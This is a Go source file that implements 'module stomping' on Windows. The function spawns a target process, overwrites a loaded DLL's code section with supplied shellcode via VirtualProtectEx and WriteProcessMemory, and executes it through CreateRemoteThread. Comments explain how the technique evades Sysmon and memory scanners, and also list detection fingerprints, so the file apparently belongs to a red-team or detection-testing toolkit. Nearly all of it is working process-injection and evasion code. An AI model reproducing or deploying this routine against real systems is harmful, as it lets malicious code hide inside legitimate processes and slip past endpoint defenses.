//go:build windows

package technique

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// StompInject overwrites a loaded DLL's .text section with shellcode (module stomping).
//
// Evasion over hijack technique:
//   - No anonymous RWX VirtualAllocEx region — shellcode lives inside a named, file-backed
//     module. The VAD entry shows a legitimate DLL path, not "Anonymous".
//   - Sysmon Event 25 does not fire on named (file-backed) section overwrites.
//   - Shellcode is indistinguishable from the DLL's own code in a VAD walk.
//
// Detection fingerprint:
//   - Sysmon Event 10: OpenProcess
//   - Sysmon Event 8: CreateRemoteThread (start address = DLL base, inside named region)
//   - Behavioral: WriteProcessMemory to an address inside a named executable section
//   - Hash/integrity mismatch between on-disk DLL and in-memory image (requires module scanning)
func StompInject(target string, shellcode []byte) error {
	fmt.Printf("  [technique] Module Stomping (DLL .text overwrite)\n")
	fmt.Printf("  [target]    %s  payload %d bytes\n", target, len(shellcode))

	pi, err := spawnProcess(target, false)
	if err != nil {
		return err
	}
	fmt.Printf("  [spawned]   PID %d (running)\n", pi.ProcessId)
	windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// Wait for the process to load its DLLs
	sleepMS(1000)

	// Find the first loaded DLL in the target (not the main exe)
	dllBase, dllSize, dllName, err := findModuleInProcess(pi.ProcessId)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("module enumeration: %w", err)
	}
	fmt.Printf("  [stomp target] %s @ 0x%x (size %d)\n", dllName, dllBase, dllSize)

	if uint32(len(shellcode)) > dllSize {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("shellcode (%d) exceeds DLL size (%d)", len(shellcode), dllSize)
	}

	// Make the DLL's memory writable (copy-on-write gives us a private copy)
	// The VAD entry still shows the original DLL path — this is the key evasion.
	oldProtect, err := virtualProtectEx(pi.Process, dllBase, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("VirtualProtectEx: %w", err)
	}
	fmt.Printf("  [protect]   0x%x → RWX (was 0x%x)\n", dllBase, oldProtect)

	// Overwrite the DLL's memory with shellcode
	// WriteProcessMemory into a named section triggers copy-on-write at the kernel level.
	// The memory is now private to this process but the VAD path is unchanged.
	var written uintptr
	if err := windows.WriteProcessMemory(pi.Process, dllBase, &shellcode[0], uintptr(len(shellcode)), &written); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}
	fmt.Printf("  [stomped]   %d bytes written over %s @ 0x%x\n", written, dllName, dllBase)

	// Restore original protection (optional but stealthier)
	virtualProtectEx(pi.Process, dllBase, uintptr(len(shellcode)), oldProtect)

	// Execute from the stomped DLL address
	// From the OS perspective: a thread starting inside a named, mapped DLL — not anonymous memory.
	thread, tid, err := createRemoteThread(pi.Process, dllBase, 0)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	defer windows.CloseHandle(thread)
	fmt.Printf("  [thread]    TID %d at 0x%x (inside %s)\n", tid, dllBase, dllName)
	return nil
}
